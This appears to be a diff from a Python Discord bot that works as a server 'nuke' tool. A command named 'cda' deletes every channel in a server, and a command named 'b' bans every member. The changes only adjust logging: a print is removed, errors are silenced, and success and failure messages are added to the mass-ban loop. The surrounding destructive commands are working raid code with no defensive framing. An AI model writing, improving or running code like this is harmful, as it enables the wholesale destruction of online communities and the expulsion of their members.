@@ -66,9 +66,8 @@ async def cda(ctx):
     for channel in list(ctx.message.guild.channels):
         try:
             await channel.delete()
-            print("banned")
         except:
-            print("i cannot ban this user")
+            pass
 
 @client.command()
 async def b(ctx,reason=None):
@@ -79,8 +78,9 @@ async def b(ctx,reason=None):
   for member in members:
     try:
        await member.ban(reason=reason)
+       print("BANNED.")
     except:
-       pass       
+       print("i cannot ban this user.")       
 
 @client.command()
 async def commands(ctx):
